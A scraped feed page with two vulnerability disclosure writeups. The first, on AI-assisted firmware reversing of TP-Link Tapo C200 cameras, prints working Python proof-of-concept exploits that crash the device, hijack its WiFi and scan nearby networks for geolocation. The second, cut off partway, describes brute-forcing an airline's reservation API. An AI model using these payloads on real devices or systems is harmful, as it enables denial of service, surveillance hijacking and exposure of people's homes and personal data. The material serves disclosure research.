<p>This post is the cleaned-up version of that journey, where I wanted to show how I approach firmware analysis these days, now that we have AI. You will notice that in several instances I will be particularly lazy and delegate to AI things I could have done manually and/or inferred myself after some more work. Keep in mind that while I <em>am</em> generally lazy, this was also an experiment in integrating and documenting how effective AI can be for security research and reverse engineering, and especially in making them accessible to less experienced/sophisticated researchers/attackers.</p>
<p>What started as a lazy weekend project turned into finding a few security vulnerabilities that affect about <a target="_blank" rel="noopener" href="https://www.zoomeye.ai/searchResult?q=IlRQUkktREVWSUNFIg==">25,000 of these devices directly exposed on the internet</a>.</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/map.png" alt="tapo c200 devices map"></p>
<h2 id="Getting-the-Firmware"><a href="#Getting-the-Firmware" title="Getting the Firmware"></a>Getting the Firmware</h2><p><small>
<h3>Tools</h3>
<ul>
    <li>
        Old friend <a href="https://java-decompiler.github.io/" target="_blank">JD-GUI</a> to reverse the Android app and get a sense of things
    </li>
    <li>
        <a href="https://aws.amazon.com/cli/" target="_blank">The AWS CLI</a> to download the firmware image.
    </li>
    <li>
        <a href="https://github.com/ReFirmLabs/binwalk" target="_blank">binwalk</a> for firmware inspection.
    </li>
    <li>
        <a href="https://grok.com/" target="_blank">Grok</a> to give a quick AI assisted look into prior research.   
    </li>
</ul>
</small></p><p>The first step is always obtaining the firmware binary file and this time it was super easy! After some <a href="https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/">basic reversing</a> of the <a target="_blank" rel="noopener" href="https://play.google.com/store/apps/details?id=com.tplink.iot&amp;hl=it">Tapo Android app</a>, I found out that TP-Link have their entire firmware repository in an open S3 bucket. No authentication required. So, you can list and download every version of every firmware they’ve ever released for any device they ever produced:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ aws s3 ls s3://download.tplinkcloud.com/ --no-sign-request --recursive</span><br></pre></td></tr></tbody></table></figure>

<p><a href="https://www.evilsocket.net/images/2025/tapo/bucket_contents.txt">The entire output is here, for the curious</a>. This provides access to the firmware image of every TP-Link device - routers, cameras, smart plugs, you name it. A reverse engineer’s candy store.</p>
<p>I grabbed version <strong>1.4.2 Build 250313 Rel.40499n</strong> for the C200 (Hardware Revision 3), named <code>Tapo_C200v3_en_1.4.2_Build_250313_Rel.40499n_up_boot-signed_1747894968535.bin</code>, and started poking around. However, the first attempt at identifying its format via binwalk was not successful, indicating that some sort of encryption or obfuscation was in place.</p>
<p>And here is where I started using AI. I used Grok to <a target="_blank" rel="noopener" href="https://x.com/i/grok/share/t9RzvgCRwIluVGnXMu39VVxDx">do some deep research</a> on how to decrypt the firmware for these cameras. Since I knew other hackers worked on this before, I delegated searching into hundreds of relevant web pages to the AI:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/grok-fw.png" alt="grok"></p>
<h3 id="Decrypting-the-Firmware"><a href="#Decrypting-the-Firmware" title="Decrypting the Firmware"></a>Decrypting the Firmware</h3><p><small>
<h3>Tools</h3>
<ul>
    <li>
        The <a href="https://github.com/robbins/tp-link-decrypt" target="_blank">tp-link-decrypt</a> tool to decrypt the firmware image.
    </li>
    <li>
        <a href="https://github.com/ReFirmLabs/binwalk" target="_blank">binwalk</a> for firmware inspection.
    </li>
</ul>
</small></p><p>Thanks to Grok, the <a target="_blank" rel="noopener" href="https://github.com/robbins/tp-link-decrypt">tp-link-decrypt</a> tool and the fact that every firmware image for every device seems to be encrypted the same exact way, we can now decrypt the firmware. The tool extracts RSA keys from TP-Link’s own GPL code releases - they publish the decryption keys themselves as part of their open source obligations.</p>
<p>Credits to @watchfulip for the <a target="_blank" rel="noopener" href="https://watchfulip.github.io/28-12-24/tp-link_c210_v2.html">original extensive TP-Link firmware research</a> and @tangrs for <a target="_blank" rel="noopener" href="https://blog.tangrs.id.au/2025/09/22/decrypting-tplink-smart-switch-firmware/">finding that the relevant binaries are published in TP-Link GPL code dumps and how to extract keys from them</a>.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>$ git <span>clone</span> https://github.com/robbins/tp-link-decrypt</span><br><span>$ <span>cd</span> tp-link-decrypt</span><br><span>$ ./preinstall.sh        </span><br><span>$ ./extract_keys.sh      </span><br><span>$ make</span><br><span>$ bin/tp-link-decrypt Tapo_C200_firmware.bin</span><br></pre></td></tr></tbody></table></figure>

<p>After decryption, the firmware revealed a fairly standard structure: a bootloader, a kernel, and a SquashFS root filesystem.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ binwalk -e Tapo_C200_v3_1.4.2_decrypted.bin</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://www.evilsocket.net/images/2025/tapo/binwalk.jpg" alt="binwalk"></p>
<h2 id="Hunting-for-Bugs"><a href="#Hunting-for-Bugs" title="Hunting for Bugs"></a>Hunting for Bugs</h2><p><small>
<h3>Tools</h3>
<ul>
    <li>
        <a href="https://github.com/NationalSecurityAgency/ghidra" target="_blank">Ghidra</a> to decompile and understand the MIPS binaries
    </li>
    <li>
        <a href="https://github.com/LaurieWired/GhidraMCP" target="_blank">GhidraMCP</a> to let an AI connect to my running Ghidra instance and support me in the process.
    </li>
    <li>
        <a href="https://github.com/cline/cline" target="_blank">
            Cline
        </a> to ask AI to explore the filesystem and find interesting components.
    </li>
    <li>
        A mix of <a href="https://claude.ai/" target="_blank">Anthropic's Opus and Sonnet 4</a>.
    </li>
</ul>
</small></p><p>Once extracted, I used AI and Cline to explore the filesystem in search of which components handle the discovery protocol, camera web API, video streaming, etc all discovered earlier while reversing the Android app.</p>
<blockquote><p lang="en" dir="ltr">Claude Opus 4: "this is the firmware of an ipcam, i'm trying to find where the webapp that serves the API is managed" <a target="_blank" rel="noopener" href="https://t.co/NrgtKGUD8h">pic.twitter.com/NrgtKGUD8h</a></p>— Simone Margaritelli (@evilsocket) <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1946238860007973282?ref_src=twsrc%5Etfw">July 18, 2025</a></blockquote> 

<p>Loading Ghidra and giving a quick look at the <code>tp_manage</code> binary, revealed the first interesting thing:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/certs.webp" alt="tp_manage"></p>
<p>This private key is not generated at boot. Similarly to <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-1099">CVE-2025-1099 for the C500</a>, the C200 embeds in its firmware the private key that serves the SSL for a few APIs. If you’re on the same network as a camera, you can MitM and decrypt their HTTPS traffic with keys you extracted from the firmware image - without ever touching the hardware. For a <em>security</em> camera streaming video of people’s homes, this is… not ideal.</p>
<p>I kept loading the other interesting binaries and exploring them in Ghidra using AI to quickly get a sense of the main features and possible entry points for an attacker.</p>
<p><strong>Asking AI to explain a function</strong> and its relation to the other functions proved to be very useful for instance to understand encryption / obfuscation routines and network protocol handlers. This allows you to go from here:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/decompiled.webp" alt="decompiled"></p>
<p>To a higher level understanding that the AI can provide:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/udpcrc.webp" alt="udp crc"></p>
<p>Another technique I found particularly effective is asking the AI to analyze a given function of interest and <strong>rename its variables and parameters to something meaningful based on context</strong>. Then do the same for the functions it calls, recursively following the branches you’re interested in. After a few iterations, what started as <code>FUN_0042eb7c(undefined2 *param_1, undefined4 param_2, int param_3)</code> becomes <code>handleConnectAp(connection *conn, int flags, json *params)</code> - and suddenly the decompiled code reads almost like the original source. </p>
<p>This iterative refinement approach, which I find a great example of human-AI collaboration where neither alone would be as efficient, is how I mapped most of the HTTP handlers, discovery protocol, and so on. What follows is the bottom line of my findings. For more details on the process, refer to <a target="_blank" rel="noopener" href="https://discord.com/channels/1100085665766572142/1396102661257957396">the original Discord thread</a>.</p>
<p>As a side note, I did not investigate (much) the exploitability of the following bugs to achieve code execution, mostly because I’m not familiar with MIPS, and it was not my intent. You can however do it relatively easily once <a target="_blank" rel="noopener" href="https://www.hacefresko.com/posts/tp-link-tapo-c200-unauthenticated-rce">obtained a shell via physical access</a>, due to the presence of the <code>/bin/gdbserver</code> binary in the firmware.</p>
<h2 id="Bug-1-Pre-Auth-ONVIF-SOAP-XML-Parser-Memory-Overflow"><a href="#Bug-1-Pre-Auth-ONVIF-SOAP-XML-Parser-Memory-Overflow" title="Bug 1: Pre-Auth ONVIF SOAP XML Parser Memory Overflow"></a>Bug 1: Pre-Auth ONVIF SOAP XML Parser Memory Overflow</h2><p>The Tapo C200 exposes an ONVIF service via the <code>/bin/main</code> server listening on port 2020 for interoperability with standard video management systems. The problem is in how it parses SOAP XML requests.</p>
<p>When processing XML elements, the parser (<code>soap_parse_and_validate_request</code> at <code>0x0045ae8c</code>) calls <code>ds_parse</code> without any bounds checking on the number of elements or total memory allocation. Send it enough XML elements, and you’ll overflow allocated memory.</p>
<p>Here’s the PoC:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></pre></td><td><pre><span></span><br><span><span>import</span> urllib.request</span><br><span><span>import</span> sys</span><br><span></span><br><span>TARGET = sys.argv[<span>1</span>]</span><br><span>ONVIF_PORT = <span>2020</span></span><br><span></span><br><span></span><br><span>params = <span>''</span>.join([<span>f'&lt;SimpleItem Name="Param<span>{i}</span>" Value="<span>{<span>"X"</span> * <span>100</span>}</span>"/&gt;'</span> </span><br><span>                  <span>for</span> i <span>in</span> <span>range</span>(<span>100000</span>)])</span><br><span></span><br><span>body = <span>f'''&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span><span>&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;</span></span><br><span><span>&lt;soap:Body&gt;</span></span><br><span><span>&lt;CreateRules xmlns="http://www.onvif.org/ver20/analytics/wsdl"&gt;</span></span><br><span><span>&lt;ConfigurationToken&gt;test&lt;/ConfigurationToken&gt;</span></span><br><span><span>&lt;Rule&gt;</span></span><br><span><span>&lt;Name&gt;TestRule&lt;/Name&gt;</span></span><br><span><span>&lt;Type&gt;tt:CellMotionDetector&lt;/Type&gt;</span></span><br><span><span>&lt;Parameters&gt;<span>{params}</span>&lt;/Parameters&gt;</span></span><br><span><span>&lt;/Rule&gt;</span></span><br><span><span>&lt;/CreateRules&gt;</span></span><br><span><span>&lt;/soap:Body&gt;</span></span><br><span><span>&lt;/soap:Envelope&gt;'''</span></span><br><span></span><br><span>req = urllib.request.Request(<span>f"http://<span>{TARGET}</span>:<span>{ONVIF_PORT}</span>/onvif/service"</span>, </span><br><span>                             data=body.encode(<span>'utf-8'</span>))</span><br><span>req.add_header(<span>'Content-Type'</span>, <span>'application/soap+xml'</span>)</span><br><span>urllib.request.urlopen(req, timeout=<span>30</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>Send this, and the camera crashes, requiring a power cycle to recover.</p>
<center>
<blockquote data-media-max-width="560"><p lang="zxx" dir="ltr"><a target="_blank" rel="noopener" href="https://t.co/JQ64e9KAJp">pic.twitter.com/JQ64e9KAJp</a></p>— Simone Margaritelli (@evilsocket) <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1946705477745733940?ref_src=twsrc%5Etfw">July 19, 2025</a></blockquote> 
</center>

<h2 id="Bug-2-Pre-Auth-HTTPS-Content-Length-Integer-Overflow"><a href="#Bug-2-Pre-Auth-HTTPS-Content-Length-Integer-Overflow" title="Bug 2: Pre-Auth HTTPS Content-Length Integer Overflow"></a>Bug 2: Pre-Auth HTTPS Content-Length Integer Overflow</h2><p>The HTTPS server routine running on port 443 has a classic integer overflow in its <code>Content-Length</code> header parsing. The vulnerable function at <code>0x004bd054</code> does this:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span>iVar1 = atoi(value);</span><br><span>param_1-&gt;content_length = iVar1;</span><br></pre></td></tr></tbody></table></figure>

<p>That’s it. No bounds checking. No validation. Just raw <code>atoi()</code> on user input.</p>
<p>On a 32-bit system, <code>atoi("4294967295")</code> causes integer overflow, resulting in undefined behavior. In this case, the camera crashes:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></pre></td><td><pre><span></span><br><span><span>import</span> socket</span><br><span><span>import</span> ssl</span><br><span><span>import</span> sys</span><br><span></span><br><span>TARGET = sys.argv[<span>1</span>]</span><br><span></span><br><span>request = <span>f"""POST / HTTP/1.1\r</span></span><br><span><span>Host: <span>{TARGET}</span>\r</span></span><br><span><span>Content-Length: 4294967295\r</span></span><br><span><span>Content-Type: application/octet-stream\r</span></span><br><span><span>Connection: close\r</span></span><br><span><span>\r</span></span><br><span><span>AAAA"""</span></span><br><span></span><br><span>context = ssl.create_default_context()</span><br><span>context.check_hostname = <span>False</span></span><br><span>context.verify_mode = ssl.CERT_NONE</span><br><span></span><br><span>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span>ssl_sock = context.wrap_socket(sock, server_hostname=TARGET)</span><br><span>ssl_sock.connect((TARGET, <span>443</span>))</span><br><span>ssl_sock.send(request.encode())</span><br></pre></td></tr></tbody></table></figure>

<center>
<blockquote data-media-max-width="560"><p lang="en" dir="ltr">And two <a target="_blank" rel="noopener" href="https://t.co/tt7eL7MA27">pic.twitter.com/tt7eL7MA27</a></p>— Simone Margaritelli (@evilsocket) <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1946706143805387252?ref_src=twsrc%5Etfw">July 19, 2025</a></blockquote> 
</center>

<p>Another crash 💪</p>
<h2 id="Bug-3-Pre-Auth-WiFi-Hijacking"><a href="#Bug-3-Pre-Auth-WiFi-Hijacking" title="Bug 3: Pre-Auth WiFi Hijacking"></a>Bug 3: Pre-Auth WiFi Hijacking</h2><p>The camera exposes an API endpoint called <code>connectAp</code> that’s used during initial setup to configure WiFi. The problem? It’s accessible <strong>without any authentication</strong>. Even after the camera is fully set up and connected to your network.</p>
<p>The vulnerable handler at <code>0x0042eb7c</code> processes the request without any auth checks:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span><span><span>void</span> <span>connectApHandler</span><span>(undefined2 *param_1,undefined4 param_2,<span>int</span> json_params)</span></span></span><br><span><span></span>{</span><br><span>    </span><br><span>    jso_add_string(iVar3,<span>"method"</span>,<span>"connectAp"</span>);</span><br><span>    jso_obj_add(iVar3,<span>"params"</span>,iVar2);</span><br><span>    iVar1 = ds_tapo_handle(param_1);</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<center>
<blockquote data-media-max-width="560"><p lang="en" dir="ltr">And three! 🚀 <a target="_blank" rel="noopener" href="https://t.co/2GZiG4bTm0">pic.twitter.com/2GZiG4bTm0</a></p>— Simone Margaritelli (@evilsocket) <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1947620181871677492?ref_src=twsrc%5Etfw">July 22, 2025</a></blockquote> 
</center>

<p>The exploit is trivial:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span></span><br><span><span>import</span> urllib.request</span><br><span><span>import</span> ssl</span><br><span><span>import</span> sys</span><br><span></span><br><span>TARGET = sys.argv[<span>1</span>]</span><br><span></span><br><span></span><br><span>payload = <span>'{"method":"connectAp","params":{"onboarding":{"connect":{"ssid":"EVIL_NETWORK","bssid":"11:11:11:11:11:11","auth":3,"encryption":2,"rssi":3,"password":"hacked","pwd_encrypted":0}}}}'</span></span><br><span></span><br><span>context = ssl.create_default_context()</span><br><span>context.check_hostname = <span>False</span>  </span><br><span>context.verify_mode = ssl.CERT_NONE</span><br><span></span><br><span>req = urllib.request.Request(<span>f"https://<span>{TARGET}</span>/"</span>, data=payload.encode(<span>'utf-8'</span>))</span><br><span>req.add_header(<span>'Content-Type'</span>, <span>'application/json'</span>)</span><br><span>urllib.request.urlopen(req, context=context, timeout=<span>10</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>This allows a remote attacker to:</p>
<ul>
<li><strong>Disconnect the camera</strong> from its legitimate network (DoS)</li>
</ul>
<p>If in WiFi range proximity:</p>
<ul>
<li><strong>Force it to connect to an attacker-controlled network</strong> (MitM)</li>
<li><strong>Intercept all video traffic</strong> once on the malicious network (not that we really needed this since the HTTPS private key is shared by all devices, as mentioned earlier XD)</li>
<li><strong>Maintain persistent access</strong> even if the owner changes their WiFi password</li>
</ul>
<h2 id="Bug-4-Pre-Auth-Nearby-WiFi-Network-Scanning"><a href="#Bug-4-Pre-Auth-Nearby-WiFi-Network-Scanning" title="Bug 4: Pre-Auth Nearby WiFi Network Scanning"></a>Bug 4: Pre-Auth Nearby WiFi Network Scanning</h2><p>Related to Bug 3, the <code>scanApList</code> method is also accessible without authentication - even when the device is not in onboarding mode. This endpoint returns a list of all WiFi networks visible to the camera:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span></span><br><span><span>import</span> urllib.request</span><br><span><span>import</span> ssl</span><br><span><span>import</span> sys</span><br><span></span><br><span>TARGET = sys.argv[<span>1</span>]</span><br><span></span><br><span>payload = <span>'{"method":"scanApList","params":{}}'</span></span><br><span></span><br><span>context = ssl.create_default_context()</span><br><span>context.check_hostname = <span>False</span>  </span><br><span>context.verify_mode = ssl.CERT_NONE</span><br><span></span><br><span>req = urllib.request.Request(<span>f"https://<span>{TARGET}</span>/"</span>, data=payload.encode(<span>'utf-8'</span>))</span><br><span>req.add_header(<span>'Content-Type'</span>, <span>'application/json'</span>)</span><br><span>response = urllib.request.urlopen(req, context=context, timeout=<span>10</span>)</span><br><span>print(response.read().decode())</span><br></pre></td></tr></tbody></table></figure>

<p>A test on one of the devices exposed on the internet:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/aps.png" alt="aps"></p>
<p>This is particularly concerning given the number of these devices exposed on the internet. An attacker can remotely enumerate WiFi networks in the camera’s vicinity, including:</p>
<ul>
<li><strong>SSIDs</strong> of nearby networks</li>
<li><strong>BSSIDs</strong> (MAC addresses of access points)</li>
<li><strong>Signal strength</strong> (useful for triangulation)</li>
<li><strong>Security configurations</strong></li>
</ul>
<p>Here’s where it gets worse: tools like <a target="_blank" rel="noopener" href="https://github.com/darkosancanin/apple_bssid_locator">apple_bssid_locator</a> can query Apple’s location services API with a BSSID and return precise GPS coordinates.</p>
<p>This means an attacker can:</p>
<ol>
<li>Find an exposed Tapo camera via services like ZoomEye, Shodan or similar indexes</li>
<li>Use <code>scanApList</code> to retrieve nearby WiFi BSSIDs</li>
<li>Query Apple’s location database with those BSSIDs</li>
<li><strong>Pinpoint the camera’s physical location to within a few meters</strong></li>
</ol>
<p>Remote attackers can not only see what WiFi networks exist around a camera - they can determine exactly where that camera (and by extension, the home or business it’s monitoring) is located on a map.</p>
<h2 id="Disclosure"><a href="#Disclosure" title="Disclosure"></a>Disclosure</h2><p>I’ve decided to follow the <a target="_blank" rel="noopener" href="https://projectzero.google/vulnerability-disclosure-policy.html">industry standard</a> <strong>90+30 days</strong> responsible disclosure process; here’s the timeline:</p>
<ul>
<li><strong>July 22, 2025</strong>: Sent initial report to TP-Link’s security team (<a href="https://www.evilsocket.net/cdn-cgi/l/email-protection#eec8cddfdfdbd5c8cddfdedfd5c8cdd7d7d5c8cd96d9dbd5c8cd96d9dcd5c8cddfdedbd5c8cd96d9dad5c8cddfdcdfd5c8cdd8dad5c8cd96d9dad5c8cddfdfdcd5c8cddadbd5c8cddfded6d5c8cddfdedbd5c8cd96d88bd5c8cd96d88cd5c8cd96dc8bd5c8cd96d8ddd5c8cd96d888d5c8cddfded7d5">security@tp-link.com</a>) with full technical details, PoC exploits and videos. All compiled according to <a target="_blank" rel="noopener" href="https://www.tp-link.com/en/press/security-advisory/">their guidelines</a>.</li>
<li><strong>July 22, 2025</strong>: Acknowledgment received.</li>
<li><strong>August 22, 2025</strong>: TP-Link confirms they’re still reviewing the report</li>
<li><strong>September 27, 2025</strong>: TP-Link responds and sets the timeline for the remediation patch to the end of November 2025.</li>
<li><strong>November 2025</strong>: Nothing happens.</li>
<li><strong>December 1, 2025</strong>: Sent follow up email, no response.</li>
<li><strong>December 4, 2025</strong>: Sent another follow up email, which TP-Link responds to, further postponing the patch to the following week.</li>
<li><strong>The following week</strong>: Nothing happens.</li>
<li><strong>December 19, 2025</strong>: Public disclosure <strong>after 150 days</strong>.</li>
</ul>
<p>The 90+30 period has long passed, so I decided to publish this writeup.</p>
<h2 id="Conflict-Of-Interest"><a href="#Conflict-Of-Interest" title="Conflict Of Interest"></a>Conflict Of Interest</h2><p><a target="_blank" rel="noopener" href="https://www.tp-link.com/us/press/news/21730/">As of April 25, TP-Link is a CVE Numbering Authority (CNA)</a>. This means they have the authority to assign CVE identifiers for vulnerabilities in their own products - at least for the ones reported directly to them. And they <a target="_blank" rel="noopener" href="https://www.tp-link.com/it/press/security-advisory/">actively encourage responsible disclosure directly to their security team</a>, which means they control a considerable pipeline of vulnerability reports.</p>
<p>On their <a target="_blank" rel="noopener" href="https://www.tp-link.com/us/landing/security-commitment/">Security Commitment page</a>, TP-Link prominently displays charts comparing their CVE count to competitors. They explicitly market themselves as having fewer CVEs than Cisco, Netgear, and D-Link. They state they “aim to patch vulnerabilities within 90 days.”</p>
<p>There’s an obvious and structural conflict of interest when a vendor is allowed to be their own CNA while simultaneously using their CVE count as a marketing metric.</p>

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reverse Engineering US Airline's PNR System and Accessing All Reservations (116 pts)]]></title>
            <link>https://alexschapiro.com/security/vulnerability/2025/11/20/avelo-airline-reservation-api-vulnerability</link>
            <guid>46328992</guid>
            <pubDate>Fri, 19 Dec 2025 18:15:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://alexschapiro.com/security/vulnerability/2025/11/20/avelo-airline-reservation-api-vulnerability">https://alexschapiro.com/security/vulnerability/2025/11/20/avelo-airline-reservation-api-vulnerability</a>, See on <a href="https://news.ycombinator.com/item?id=46328992">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Timeline &amp; Responsible Disclosure</em></p>

<p><em><strong>Initial Contact:</strong> Upon discovering this vulnerability on <strong>October 15, 2025</strong>, I immediately reached out to security contacts at Avelo Airlines via email.</em></p>

<p><em><strong>October 16, 2025:</strong> The Avelo cybersecurity team responded quickly and professionally. We had productive email exchanges where I detailed the vulnerability, including the lack of last name verification and rate limiting on reservation endpoints.</em></p>

<p><em><strong>November 13, 2025:</strong> Avelo pushed a fix to production and notified me that the vulnerabilities were patched. I independently verified the fixes were in place before publication, and informed the Avelo team of my intention to write a technical blog post about this vulnerability, highlighting their cooperative and responsive approach to security disclosure.</em></p>

<p><em><strong>Publication:</strong> November 20, 2025.</em></p>

<p><em>The Avelo team was responsive, professional, and took the findings seriously throughout the disclosure process. They acknowledged the severity, worked quickly to remediate the issues, and maintained clear communication. This is a model example of how organizations should handle security disclosures.</em></p>

<hr>

<p>After my <a href="https://coursetable.com/catalog?selectSeasons=202503&amp;searchText=akkad&amp;course-modal=202503-13154">9 AM Akkadian class</a>, I sat down to change my flight out of New Haven with Avelo Airlines, and noticed that my computer was making some unusual requests. After digging a little further, I stepped into a landmine of customer information exposure. In the wrong hands, this critical vulnerability could allow an attacker to access full reservation details, including PII, government ID numbers, and partial payment info, for every Avelo passenger, past and present.</p>

<p>Before I walk you through my work on that Tuesday morning, let’s establish how airlines generally manage their reservations.</p>

<h2 id="how-airline-logins-should-work">How Airline Logins <em>Should</em> Work</h2>

<p>Normally, to access a flight reservation (which often contains sensitive information like passport numbers, Known Traveler Numbers, and partial credit card data), you need at least two pieces of information: a <strong>confirmation code</strong> and the <strong>passenger’s last name</strong>.</p>

<p>This two-factor system is generally secure. The space of all 6-character alphanumeric confirmation codes combined with all possible last names is astronomically large, making it impossible to “guess” a valid pair.</p>

<p>But what if the last name check was missing?</p>

<p>Suddenly, the problem becomes much simpler. The <em>entire</em> keyspace an attacker needs to guess is just the confirmation code. In Avelo’s case, their codes are 6-character alphanumeric strings (<code>[A-Z0-9]</code>).</p>

<p>Let’s do the math:</p>

<ul>
  <li><strong>Keyspace:</strong> 36 characters (26 letters + 10 digits)</li>
  <li><strong>Length:</strong> 6</li>
  <li><strong>Total Combinations:</strong> 36^6 = <strong>2,176,782,336</strong> (~2.18 billion)</li>
</ul>

<p>That’s a big number, but it’s not “astronomically large.” It’s well within the reach of a modern brute-force attack.</p>

<h3 id="the-attack-timeline">The Attack Timeline</h3>

<p>How long would it take to try all 2.18 billion combinations? The time is just <code>2.18 billion / (requests per second)</code>.</p>

<ul>
  <li>At <strong>1,000 req/s</strong> (a modest script): 2.18 million seconds, or <strong>~25 days</strong>.</li>
  <li>At <strong>10,000 req/s</strong> (a decent server): 218,000 seconds, or <strong>~2.5 days</strong>.</li>
  <li>At <strong>100,000 req/s</strong> (a small cluster of servers, costing $400-$700)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">1</a></sup>: 21,800 seconds, or <strong>~6 hours</strong>.</li>
</ul>

<p><strong>Bottom line:</strong> If Avelo’s flight system has no rate limiting and doesn’t require a last name, an adversary could extract all passenger data in about 6 hours for less than a thousand dollars.</p>

<h3 id="even-faster-than-6-hours">Even Faster Than 6 Hours</h3>

<p>Even worse, they don’t need to run for 6 hours. With an estimated 8 million tickets sold, the “hit rate” is roughly <strong>1 in every 270 guesses</strong> (2.18B / 8M). An attacker would start getting valid PII back in <em>seconds</em>.</p>

<h2 id="back-to-the-story-finding-the-flaw">Back to the Story: Finding the Flaw</h2>

<p>This was all just theory until I looked at my network traffic. As I was changing my reservation, I saw a GET request to an API endpoint:</p>

<div><pre><code>https://www.aveloair.com/payment/services/reservation/{code}
</code></pre></div>

<p><img src="https://alexschapiro.com/assets/images/avelo-security/endpoint.png" alt="Screenshot of the reservation API endpoint"></p>

<p>The parameter at the end didn’t seem like a reservation code, but the response contained all relevant reservation data, so I decided to probe further. On a hunch, I swapped that token for my <em>actual</em> 6-character code and re-sent the request.</p>

<p><strong>Voila.</strong> The server responded with a massive JSON object containing my entire reservation.</p>

<p>This endpoint wasn’t asking for my last name. The only other security was a standard authentication cookie… but was that cookie tied to <em>my</em> reservation?</p>

<p>I quickly texted a friend for their old Avelo confirmation code. I plugged it into the URL, kept <em>my own cookie</em>, and hit send. But there was no way it could poss-</p>

<p><strong>It worked.</strong></p>

<p>I was looking at their full reservation. <strong>Any</strong> valid authentication cookie could be used to query <strong>any</strong> reservation, using only the 6-character code. The theoretical flaw was real.</p>

<h2 id="executing-the-attack-no-rate-limiting">Executing the Attack: No Rate Limiting</h2>

<p>The only remaining (partial) defense was rate-limiting. I wrote a quick multi-threaded Python script to generate random 6-character codes and hit the endpoint.</p>

<p>The requests flew. There was no WAF, no IP blocking, no CAPTCHA.</p>

<p><img src="https://alexschapiro.com/assets/images/avelo-security/validcodes.png" alt="Valid reservation codes being discovered">
<em>The script quickly finding valid reservation codes</em></p>

<p>Within minutes, my script was logging hundreds of valid reservations. Troves of data were being returned, including from passengers flying on government business with <code>@dot.gov</code> and <code>@faa.gov</code> email addresses.</p>

<p>A successful hit returned the <em>entire</em> reservation object. This was a complete data breach for each passenger – including myself!</p>

<p>(Note: During further testing, I discovered a similar vulnerability on a different reservation endpoint. I promptly notified the Avelo team, and they patched that endpoint as well before publication.)</p>

<h2 id="what-data-was-leaked">What Data Was Leaked?</h2>

<p>For every valid code, the API returned:</p>

<ul>
  <li><strong>Full Passenger PII:</strong> <code>FullName</code>, <code>DateOfBirth</code>, <code>Gender</code></li>
  <li><strong>Government IDs:</strong> <code>IDDocuments.IDNumber</code> (this field contained Known Traveler Numbers (KNTs) and, in other cases, Passport Numbers)</li>
  <li><strong>Contact Info:</strong> phone numbers, email addresses</li>
  <li><strong>Full Itinerary:</strong> Flight numbers, dates, times, and <code>SeatLocation</code></li>
  <li><strong>Payment Details:</strong> <code>CardNumber</code> (masked: <code>************8</code>), <code>DateTimeExpiration</code>, and billing <code>Address.PostalCode</code></li>
  <li><strong>Vouchers:</strong> <code>PaymentInternals.AccountNumber</code> and <code>Amount.Value</code></li>
  <li><strong>PCI Data:</strong> <code>PaymentCards.TrackData</code> — This field seemed to contain partial magnetic-stripe data</li>
</ul>

<div>
  <div>
